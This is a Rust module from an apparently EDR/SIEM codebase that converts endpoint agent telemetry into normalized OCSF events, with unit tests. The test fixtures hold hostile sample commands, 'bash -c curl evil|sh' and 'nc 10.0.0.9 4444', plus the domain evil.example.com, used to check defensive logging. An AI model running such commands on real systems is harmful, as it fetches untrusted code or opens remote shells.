//! Map an agent [`EndpointEvent`](pb::EndpointEvent) onto the normalized
//! [`sigil_core::Event`] the rest of the SIEM consumes. Endpoint telemetry is
//! already structured, so it bypasses the codec/normalize path and is stamped
//! directly here (DESIGN §6 — the `Event` type is the cross-crate contract).

use prost::Message;
use serde_json::Value;
use sigil_core::{now_micros, EntityRef, Event, OcsfClass, Severity};
use sigil_edr_proto::pb;

/// OCSF class for an agent [`pb::EventKind`].
pub fn class_for(kind: pb::EventKind) -> OcsfClass {
    use pb::EventKind::*;
    match kind {
        ProcessStart | ProcessStop => OcsfClass::ProcessActivity,
        FileCreate | FileModify | FileDelete => OcsfClass::FileSystemActivity,
        NetworkConnect => OcsfClass::NetworkActivity,
        DnsQuery => OcsfClass::DnsActivity,
        ModuleLoad => OcsfClass::ModuleActivity,
        RegistrySet => OcsfClass::RegistryKeyActivity,
        PersistenceAdd => OcsfClass::ScheduledJobActivity,
        Unspecified => OcsfClass::Other(1008),
    }
}

/// Build a normalized [`Event`] from one agent telemetry record. `agent_id` and
/// `hostname` identify the origin host; `tenant` is the owning namespace.
pub fn to_event(agent_id: &str, hostname: &str, tenant: &str, ee: &pb::EndpointEvent) -> Event {
    let kind = ee.kind();
    let mut ev = Event::new(tenant);
    if ee.ts > 0 {
        ev.ts = ee.ts as i64;
    }
    ev.ingest_ts = now_micros();
    ev.ocsf_class = class_for(kind);
    ev.severity = Severity::Informational;
    ev.host = Some(EntityRef {
        kind: "host".into(),
        id: agent_id.into(),
        name: Some(hostname.into()),
    });
    ev.labels = vec!["edr".into(), format!("agent:{agent_id}")];

    let mut f = Fields(&mut ev.fields);
    f.put_str("agent.id", agent_id);
    f.put_str("host.name", hostname);
    f.put_str("event.kind", event_kind_name(kind));
    if !ee.user.is_empty() {
        f.put_str("user.name", &ee.user);
    }

    // Actor = the process that performed the activity.
    if let Some(p) = &ee.process {
        ev.actor = Some(process_entity(agent_id, p));
        put_process(&mut f, "process", p);
    }
    if let Some(p) = &ee.parent {
        put_process(&mut f, "parent", p);
    }

    // Target + type-specific fields.
    match kind {
        pb::EventKind::FileCreate | pb::EventKind::FileModify | pb::EventKind::FileDelete => {
            if let Some(file) = &ee.file {
                ev.target = Some(EntityRef {
                    kind: "file".into(),
                    id: file.path.clone(),
                    name: None,
                });
                f.put_str("file.path", &file.path);
                f.put_str("file.hash.sha256", &file.hash_sha256);
                f.put_str("file.mode", &file.mode);
                if file.size > 0 {
                    f.put("file.size", Value::from(file.size));
                }
            }
        }
        pb::EventKind::NetworkConnect => {
            if let Some(n) = &ee.network {
                ev.target = Some(EntityRef {
                    kind: "ip".into(),
                    id: n.remote_addr.clone(),
                    name: None,
                });
                f.put_str("network.proto", &n.proto);
                f.put_str("network.direction", &n.direction);
                f.put_str("source.ip", &n.local_addr);
                f.put_str("destination.ip", &n.remote_addr);
                if n.local_port > 0 {
                    f.put("source.port", Value::from(n.local_port));
                }
                if n.remote_port > 0 {
                    f.put("destination.port", Value::from(n.remote_port));
                }
            }
        }
        pb::EventKind::DnsQuery => {
            if let Some(d) = &ee.dns {
                ev.target = Some(EntityRef {
                    kind: "domain".into(),
                    id: d.query.clone(),
                    name: None,
                });
                f.put_str("dns.question.name", &d.query);
                f.put_str("dns.question.type", &d.qtype);
                if !d.answers.is_empty() {
                    f.put("dns.answers", Value::from(d.answers.clone()));
                }
            }
        }
        pb::EventKind::ModuleLoad => {
            if let Some(m) = &ee.module {
                ev.target = Some(EntityRef {
                    kind: "file".into(),
                    id: m.path.clone(),
                    name: None,
                });
                f.put_str("module.path", &m.path);
                f.put_str("module.hash.sha256", &m.hash_sha256);
            }
        }
        pb::EventKind::RegistrySet => {
            if let Some(r) = &ee.registry {
                ev.target = Some(EntityRef {
                    kind: "registry".into(),
                    id: r.key.clone(),
                    name: Some(r.value_name.clone()),
                });
                f.put_str("registry.key", &r.key);
                f.put_str("registry.value.name", &r.value_name);
                f.put_str("registry.value.data", &r.value_data);
            }
        }
        pb::EventKind::PersistenceAdd => {
            if let Some(p) = &ee.persistence {
                ev.target = Some(EntityRef {
                    kind: "file".into(),
                    id: p.target.clone(),
                    name: Some(p.name.clone()),
                });
                f.put_str("persistence.kind", &p.kind);
                f.put_str("persistence.name", &p.name);
                f.put_str("persistence.target", &p.target);
            }
        }
        _ => {}
    }

    for (k, v) in &ee.extra {
        f.put_str(k, v);
    }

    ev.message = summarize(hostname, kind, ee);
    ev.raw = ee.encode_to_vec();
    ev
}

fn process_entity(agent_id: &str, p: &pb::Process) -> EntityRef {
    EntityRef {
        kind: "process".into(),
        id: format!("{agent_id}:{}", p.pid),
        name: (!p.name.is_empty()).then(|| p.name.clone()),
    }
}

fn put_process(f: &mut Fields, prefix: &str, p: &pb::Process) {
    f.put_str(&format!("{prefix}.name"), &p.name);
    f.put_str(&format!("{prefix}.executable"), &p.path);
    f.put_str(&format!("{prefix}.command_line"), &p.cmdline);
    f.put_str(&format!("{prefix}.hash.sha256"), &p.hash_sha256);
    f.put_str(&format!("{prefix}.user"), &p.user);
    if p.pid > 0 {
        f.put(&format!("{prefix}.pid"), Value::from(p.pid));
    }
    if p.ppid > 0 {
        f.put(&format!("{prefix}.ppid"), Value::from(p.ppid));
    }
}

fn summarize(hostname: &str, kind: pb::EventKind, ee: &pb::EndpointEvent) -> String {
    let proc = ee
        .process
        .as_ref()
        .map(|p| {
            if p.cmdline.is_empty() {
                p.name.clone()
            } else {
                p.cmdline.clone()
            }
        })
        .unwrap_or_default();
    match kind {
        pb::EventKind::ProcessStart => format!("{hostname}: process start {proc}"),
        pb::EventKind::ProcessStop => format!("{hostname}: process stop {proc}"),
        pb::EventKind::FileCreate | pb::EventKind::FileModify | pb::EventKind::FileDelete => {
            let path = ee.file.as_ref().map(|f| f.path.as_str()).unwrap_or("");
            format!("{hostname}: {} {path} by {proc}", event_kind_name(kind))
        }
        pb::EventKind::NetworkConnect => {
            let n = ee.network.as_ref();
            let dst = n
                .map(|n| format!("{}:{}", n.remote_addr, n.remote_port))
                .unwrap_or_default();
            format!("{hostname}: connect {dst} by {proc}")
        }
        pb::EventKind::DnsQuery => {
            let q = ee.dns.as_ref().map(|d| d.query.as_str()).unwrap_or("");
            format!("{hostname}: dns {q} by {proc}")
        }
        pb::EventKind::ModuleLoad => {
            let m = ee.module.as_ref().map(|m| m.path.as_str()).unwrap_or("");
            format!("{hostname}: module load {m} by {proc}")
        }
        pb::EventKind::RegistrySet => {
            let k = ee.registry.as_ref().map(|r| r.key.as_str()).unwrap_or("");
            format!("{hostname}: registry set {k} by {proc}")
        }
        pb::EventKind::PersistenceAdd => {
            let p = ee.persistence.as_ref();
            let name = p
                .map(|p| format!("{}/{}", p.kind, p.name))
                .unwrap_or_default();
            format!("{hostname}: persistence add {name} by {proc}")
        }
        pb::EventKind::Unspecified => format!("{hostname}: endpoint event"),
    }
}

/// The event-kind name used for the `event.kind` field (snake_case).
fn event_kind_name(kind: pb::EventKind) -> &'static str {
    match kind {
        pb::EventKind::Unspecified => "unspecified",
        pb::EventKind::ProcessStart => "process_start",
        pb::EventKind::ProcessStop => "process_stop",
        pb::EventKind::FileCreate => "file_create",
        pb::EventKind::FileModify => "file_modify",
        pb::EventKind::FileDelete => "file_delete",
        pb::EventKind::NetworkConnect => "network_connect",
        pb::EventKind::DnsQuery => "dns_query",
        pb::EventKind::ModuleLoad => "module_load",
        pb::EventKind::RegistrySet => "registry_set",
        pb::EventKind::PersistenceAdd => "persistence_add",
    }
}

/// Thin wrapper to insert only non-empty values into the field map.
struct Fields<'a>(&'a mut std::collections::BTreeMap<String, Value>);

impl Fields<'_> {
    fn put_str(&mut self, key: &str, val: &str) {
        if !val.is_empty() {
            self.0.insert(key.to_string(), Value::from(val));
        }
    }
    fn put(&mut self, key: &str, val: Value) {
        self.0.insert(key.to_string(), val);
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn proc(name: &str, cmd: &str) -> pb::Process {
        pb::Process {
            pid: 42,
            ppid: 1,
            name: name.into(),
            path: format!("/usr/bin/{name}"),
            cmdline: cmd.into(),
            hash_sha256: "abc".into(),
            user: "root".into(),
        }
    }

    #[test]
    fn process_event_maps_to_process_activity() {
        let ee = pb::EndpointEvent {
            id: "e1".into(),
            ts: 1000,
            kind: pb::EventKind::ProcessStart as i32,
            process: Some(proc("bash", "bash -c curl evil|sh")),
            ..Default::default()
        };
        let ev = to_event("agent-1", "host-a", "acme", &ee);
        assert_eq!(ev.ocsf_class, OcsfClass::ProcessActivity);
        assert_eq!(ev.ts, 1000);
        assert_eq!(ev.tenant, "acme");
        assert_eq!(ev.host.as_ref().unwrap().name.as_deref(), Some("host-a"));
        assert_eq!(
            ev.field_str("process.command_line").as_deref(),
            Some("bash -c curl evil|sh")
        );
        assert!(ev.labels.contains(&"edr".to_string()));
    }

    #[test]
    fn dns_event_maps_to_dns_activity_with_target() {
        let ee = pb::EndpointEvent {
            id: "e2".into(),
            ts: 2000,
            kind: pb::EventKind::DnsQuery as i32,
            process: Some(proc("curl", "curl x")),
            dns: Some(pb::DnsInfo {
                query: "evil.example.com".into(),
                qtype: "A".into(),
                answers: vec!["1.2.3.4".into()],
            }),
            ..Default::default()
        };
        let ev = to_event("agent-1", "host-a", "acme", &ee);
        assert_eq!(ev.ocsf_class, OcsfClass::DnsActivity);
        assert_eq!(ev.target.as_ref().unwrap().id, "evil.example.com");
        assert_eq!(
            ev.field_str("dns.question.name").as_deref(),
            Some("evil.example.com")
        );
    }

    #[test]
    fn network_event_sets_destination_fields() {
        let ee = pb::EndpointEvent {
            id: "e3".into(),
            ts: 3000,
            kind: pb::EventKind::NetworkConnect as i32,
            process: Some(proc("nc", "nc 10.0.0.9 4444")),
            network: Some(pb::NetworkInfo {
                proto: "tcp".into(),
                local_addr: "10.0.0.1".into(),
                local_port: 55000,
                remote_addr: "10.0.0.9".into(),
                remote_port: 4444,
                direction: "outbound".into(),
            }),
            ..Default::default()
        };
        let ev = to_event("agent-1", "host-a", "acme", &ee);
        assert_eq!(ev.ocsf_class, OcsfClass::NetworkActivity);
        assert_eq!(ev.field_str("destination.ip").as_deref(), Some("10.0.0.9"));
        assert_eq!(ev.field_str("destination.port"), Some("4444".to_string()));
    }
}
